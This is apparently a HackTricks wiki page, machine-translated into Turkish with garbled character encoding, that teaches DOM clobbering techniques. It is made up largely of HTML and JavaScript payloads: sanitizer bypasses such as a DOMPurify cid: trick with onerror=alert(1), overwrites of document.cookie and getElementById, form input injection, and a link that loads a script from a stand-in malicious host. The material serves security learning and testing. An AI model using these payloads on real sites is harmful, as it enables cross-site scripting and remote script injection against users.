# Dom Clobbering

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ğŸ’¬ [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

## **Temel Bilgiler**

HTML etiketlerinde **`id`** ve **`name`** Ã¶znitelikleri ile **JS baÄŸlamÄ±nda** **global deÄŸiÅŸkenler** oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r.
```html
<form id=x></form>
<script> console.log(typeof document.x) //[object HTMLFormElement] </script>
```
**Sadece** belirli Ã¶ÄŸeler **name attribute** kullanarak globals'Ä± clobber edebilir, bunlar: `embed`, `form`, `iframe`, `image`, `img` ve `object`.

Ä°lginÃ§ bir ÅŸekilde, bir **form element** kullanarak bir deÄŸiÅŸkeni **clobber** ettiÄŸinizde, Ã¶ÄŸenin kendisinin **`toString`** deÄŸeri alÄ±rsÄ±nÄ±z: `[object HTMLFormElement]` ama **anchor** ile **`toString`** anchor'un **`href`** deÄŸeri olacaktÄ±r. Bu nedenle, **`a`** etiketi kullanarak clobber yaparsanÄ±z, **string** olarak **iÅŸlendiÄŸinde** **deÄŸeri** **kontrol** edebilirsiniz:
```html
<a href="controlled string" id=x></a>
<script>
console.log(x);//controlled string
</script>
```
### Diziler ve Ã–zellikler

Bir **diziyi** ve **nesne Ã¶zelliklerini** de **Ã§Ã¶kmek** mÃ¼mkÃ¼ndÃ¼r:
```html
<a id=x>
<a id=x name=y href=controlled>
<script>
console.log(x[1])//controlled
console.log(x.y)//controlled
</script>
```
**3. bir niteliÄŸi** (Ã¶rneÄŸin x.y.z) etkisiz hale getirmek iÃ§in bir **`form`** kullanmalÄ±sÄ±nÄ±z:
```html
<form id=x name=y><input id=z value=controlled></form>
<form id=x></form>
<script>
alert(x.y.z.value)//controlled
</script>
```
Daha fazla Ã¶zelliÄŸi clobberlamak **daha karmaÅŸÄ±k ama yine de mÃ¼mkÃ¼ndÃ¼r**, iframe'ler kullanarak:
```html
<iframe name=x srcdoc="<a id=y href=controlled></a>"></iframe>
<style>@import 'https://google.com';</style>
<script>alert(x.y)//controlled</script>
```
{% hint style="warning" %}
style etiketi **iframe'in render edilmesi iÃ§in yeterince zaman vermek** amacÄ±yla kullanÄ±lÄ±r. Bunu yapmadan **undefined** uyarÄ±sÄ± alÄ±rsÄ±nÄ±z.
{% endhint %}

Daha derin Ã¶zellikleri clobber etmek iÃ§in, **html kodlamasÄ± ile iframeler** kullanabilirsiniz:
```html
<iframe name=a srcdoc="<iframe srcdoc='<iframe name=c srcdoc=<a/id=d&amp;amp;#x20;name=e&amp;amp;#x20;href=\controlled&amp;amp;gt;<a&amp;amp;#x20;id=d&amp;amp;gt; name=d>' name=b>"></iframe>
<style>@import 'https://google.com';</style>
<script>
alert(a.b.c.d.e)//controlled
</script>
```
### **Filtre Atlatma**

EÄŸer bir filtre, bir dÃ¼ÄŸÃ¼mÃ¼n **Ã¶zellikleri** Ã¼zerinden `document.getElementByID('x').attributes` gibi bir ÅŸey kullanarak **dÃ¶nÃ¼yorsa**, **.attributes** niteliÄŸini **geÃ§ersiz kÄ±labilir** ve **filtreyi bozabilirsiniz**. DiÄŸer DOM Ã¶zellikleri, **`tagName`**, **`nodeName`** veya **`parentNode`** gibi ve daha fazlasÄ± da **geÃ§ersiz kÄ±lÄ±nabilir**.
```html
<form id=x></form>
<form id=y>
<input name=nodeName>
</form>
<script>
console.log(document.getElementById('x').nodeName)//FORM
console.log(document.getElementById('y').nodeName)//[object HTMLInputElement]
</script>
```
## **Clobbering `window.someObject`**

JavaScript'te ÅŸunu bulmak yaygÄ±ndÄ±r:
```javascript
var someObject = window.someObject || {};
```
HTML'yi sayfada manipÃ¼le etmek, `someObject`'Ä± bir DOM dÃ¼ÄŸÃ¼mÃ¼ ile geÃ§ersiz kÄ±lmayÄ± saÄŸlar ve bu da potansiyel olarak gÃ¼venlik aÃ§Ä±klarÄ± oluÅŸturabilir. Ã–rneÄŸin, `someObject`'Ä± kÃ¶tÃ¼ niyetli bir betiÄŸe iÅŸaret eden bir baÄŸlantÄ± Ã¶ÄŸesi ile deÄŸiÅŸtirebilirsiniz:
```html
<a id=someObject href=//malicious-website.com/malicious.js></a>
```
Bir aÃ§Ä±k kodda ÅŸÃ¶yle:
```html
<script>
window.onload = function(){
let someObject = window.someObject || {};
let script = document.createElement('script');
script.src = someObject.url;
document.body.appendChild(script);
};
</script>
```
Bu yÃ¶ntem, istenmeyen kodu Ã§alÄ±ÅŸtÄ±rmak iÃ§in script kaynaÄŸÄ±nÄ± kullanÄ±r.

**Hile**: **`DOMPurify`**, **`cid:`** protokolÃ¼nÃ¼ kullanmanÄ±za izin verir, bu da **Ã§ift tÄ±rnaklarÄ± URL-encode etmez**. Bu, **Ã§alÄ±ÅŸma zamanÄ±nda Ã§Ã¶zÃ¼lecek bir kodlanmÄ±ÅŸ Ã§ift tÄ±rnaÄŸÄ± enjekte edebileceÄŸiniz anlamÄ±na gelir**. Bu nedenle, **`<a id=defaultAvatar><a id=defaultAvatar name=avatar href="cid:&quot;onerror=alert(1)//">`** gibi bir ÅŸey enjekte etmek, HTML kodlanmÄ±ÅŸ `&quot;`'Ä±n **Ã§alÄ±ÅŸma zamanÄ±nda Ã§Ã¶zÃ¼leceÄŸi** ve **Ã¶zellik deÄŸerinden kaÃ§acaÄŸÄ±** iÃ§in **`onerror`** olayÄ±nÄ± **oluÅŸturur**.

BaÅŸka bir teknik, bir **`form`** Ã¶ÄŸesi kullanÄ±r. Belirli istemci tarafÄ± kÃ¼tÃ¼phaneleri, yeni oluÅŸturulan bir form Ã¶ÄŸesinin Ã¶zelliklerini temizlemek iÃ§in inceler. Ancak, formun iÃ§ine `id=attributes` olan bir `input` ekleyerek, Ã¶zellikler Ã¶zelliÄŸini etkili bir ÅŸekilde geÃ§ersiz kÄ±larsÄ±nÄ±z ve temizleyicinin gerÃ§ek Ã¶zelliklere eriÅŸmesini engellersiniz.

Bu tÃ¼r bir clobbering Ã¶rneÄŸini [**bu CTF yazÄ±sÄ±nda bulabilirsiniz**](iframes-in-xss-and-csp.md#iframes-in-sop-2).

## Belge nesnesini clobbering

Belgelerine gÃ¶re, DOM Clobbering kullanarak belge nesnesinin Ã¶zelliklerini geÃ§ersiz kÄ±lmak mÃ¼mkÃ¼ndÃ¼r:

> [Document](https://html.spec.whatwg.org/multipage/dom.html#document) arayÃ¼zÃ¼ [adlandÄ±rÄ±lmÄ±ÅŸ Ã¶zellikleri destekler](https://webidl.spec.whatwg.org/#dfn-support-named-properties). [Document](https://html.spec.whatwg.org/multipage/dom.html#document) nesnesinin [desteklenen Ã¶zellik adlarÄ±](https://webidl.spec.whatwg.org/#dfn-supported-property-names) her an iÃ§in aÅŸaÄŸÄ±dakilerden oluÅŸur, [aÄŸaÃ§ sÄ±rasÄ±na](https://dom.spec.whatwg.org/#concept-tree-order) gÃ¶re, katkÄ±da bulunan Ã¶ÄŸeye gÃ¶re, sonraki kopyalarÄ± gÃ¶z ardÄ± ederek ve aynÄ± Ã¶ÄŸe her ikisini de katkÄ±da bulunduÄŸunda, [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) Ã¶zelliklerinden gelen deÄŸerlerin, ad Ã¶zelliklerinden gelen deÄŸerlerden Ã¶nce geldiÄŸi:
>
> \- BoÅŸ olmayan bir ad iÃ§erik Ã¶zelliÄŸine sahip ve [bir belge aÄŸacÄ±nda](https://dom.spec.whatwg.org/#in-a-document-tree) belge kÃ¶kÃ¼ olarak bulunan tÃ¼m [aÃ§Ä±k](https://html.spec.whatwg.org/multipage/dom.html#exposed) [embed](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-embed-element), [form](https://html.spec.whatwg.org/multipage/forms.html#the-form-element), [iframe](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-iframe-element), [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) ve [aÃ§Ä±k](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) Ã¶ÄŸeleri iÃ§in ad iÃ§erik Ã¶zelliÄŸinin deÄŸeri;\
> \
> \- BoÅŸ olmayan bir [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) iÃ§erik Ã¶zelliÄŸine sahip ve [bir belge aÄŸacÄ±nda](https://dom.spec.whatwg.org/#in-a-document-tree) belge kÃ¶kÃ¼ olarak bulunan tÃ¼m [aÃ§Ä±k](https://html.spec.whatwg.org/multipage/dom.html#exposed) [object](https://html.spec.whatwg.org/multipage/iframe-embed-object.html#the-object-element) Ã¶ÄŸeleri iÃ§in [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) iÃ§erik Ã¶zelliÄŸinin deÄŸeri;\
> \
> \- BoÅŸ olmayan bir [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) iÃ§erik Ã¶zelliÄŸine ve boÅŸ olmayan bir ad iÃ§erik Ã¶zelliÄŸine sahip olan ve [bir belge aÄŸacÄ±nda](https://dom.spec.whatwg.org/#in-a-document-tree) belge kÃ¶kÃ¼ olarak bulunan tÃ¼m [img](https://html.spec.whatwg.org/multipage/embedded-content.html#the-img-element) Ã¶ÄŸeleri iÃ§in [id](https://html.spec.whatwg.org/multipage/dom.html#the-id-attribute) iÃ§erik Ã¶zelliÄŸinin deÄŸeri.

Bu tekniÄŸi kullanarak, yaygÄ±n olarak kullanÄ±lan **`document.cookie`, `document.body`, `document.children`** gibi deÄŸerleri ve hatta `document.querySelector` gibi Document arayÃ¼zÃ¼ndeki yÃ¶ntemleri geÃ§ersiz kÄ±labilirsiniz.
```javascript
document.write("<img name=cookie />")

document.cookie
<img name="cookie">

typeof(document.cookie)
'object'

//Something more sanitize friendly than a img tag
document.write("<form name=cookie><input id=toString></form>")

document.cookie
HTMLCollection(2)Â [img, form, cookie: img]

typeof(document.cookie)
'object
```
## Eleman clobbering'den sonra yazma

**`document.getElementById()`** ve **`document.querySelector()`** Ã§aÄŸrÄ±larÄ±nÄ±n sonuÃ§larÄ±, aynÄ± id niteliÄŸine sahip bir `<html>` veya `<body>` etiketi enjekte edilerek deÄŸiÅŸtirilebilir. Ä°ÅŸte bunun nasÄ±l yapÄ±lacaÄŸÄ±:
```html
<div style="display:none" id="cdnDomain" class="x">test</div>
<p>
<html id="cdnDomain" class="x">clobbered</html>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
alert(document.querySelector('.x').innerText); // Clobbered
</script>
```
AyrÄ±ca, bu enjekte edilmiÅŸ HTML/body etiketlerini gizlemek iÃ§in stiller kullanarak, `innerText` iÃ§indeki diÄŸer metinlerden gelen mÃ¼dahale Ã¶nlenebilir ve bÃ¶ylece saldÄ±rÄ±nÄ±n etkinliÄŸi artÄ±rÄ±labilir:
```html
<div style="display:none" id="cdnDomain">test</div>
<p>existing text</p>
<html id="cdnDomain">clobbered</html>
<style>
p{display:none;}
</style>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVG ile yapÄ±lan araÅŸtÄ±rmalar, bir `<body>` etiketinin de etkili bir ÅŸekilde kullanÄ±labileceÄŸini ortaya koydu:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg><body id="cdnDomain">clobbered</body></svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
SVG'de HTML etiketinin Chrome ve Firefox gibi tarayÄ±cÄ±larda Ã§alÄ±ÅŸabilmesi iÃ§in bir `<foreignobject>` etiketi gereklidir:
```html
<div style="display:none" id="cdnDomain">example.com</div>
<svg>
<foreignobject>
<html id="cdnDomain">clobbered</html>
</foreignobject>
</svg>
<script>
alert(document.getElementById('cdnDomain').innerText); // Clobbered
</script>
```
## Clobbering Forms

Bir **formun iÃ§ine yeni giriÅŸler eklemek** mÃ¼mkÃ¼ndÃ¼r, sadece bazÄ± etiketler iÃ§inde **`form` niteliÄŸini belirterek**. Bunu, **formun iÃ§ine yeni deÄŸerler eklemek** ve hatta yeni bir **buton** eklemek iÃ§in kullanabilirsiniz **gÃ¶ndermek iÃ§in** (clickjacking veya bazÄ± `.click()` JS kodlarÄ±nÄ± kÃ¶tÃ¼ye kullanarak): 

{% code overflow="wrap" %}
```html
<!--Add a new attribute and a new button to send-->
<textarea form=id-other-form name=info>
";alert(1);//
</textarea>
<button form=id-other-form type="submit" formaction="/edit" formmethod="post">
Click to send!
</button>
```
{% endcode %}

* Daha fazla form Ã¶zniteliÄŸi iÃ§in [**buton iÃ§in buraya bakÄ±n**](https://www.w3schools.com/tags/tag\_button.asp)**.**

## Referanslar

* [https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering](https://portswigger.net/research/hijacking-service-workers-via-dom-clobbering)
* [https://portswigger.net/web-security/dom-based/dom-clobbering](https://portswigger.net/web-security/dom-based/dom-clobbering)
* Heyes, Gareth. JavaScript for hackers: Bir hacker gibi dÃ¼ÅŸÃ¼nmeyi Ã¶ÄŸrenin.

{% hint style="success" %}
AWS Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
GCP Hacking'i Ã¶ÄŸrenin ve pratik yapÄ±n: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>HackTricks'i Destekleyin</summary>

* [**abonelik planlarÄ±nÄ±**](https://github.com/sponsors/carlospolop) kontrol edin!
* **ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) katÄ±lÄ±n ya da **Twitter'da** ğŸ¦ [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)** bizi takip edin.**
* **Hacking ipuÃ§larÄ±nÄ± paylaÅŸmak iÃ§in** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github reposuna PR gÃ¶nderin.

</details>
{% endhint %}
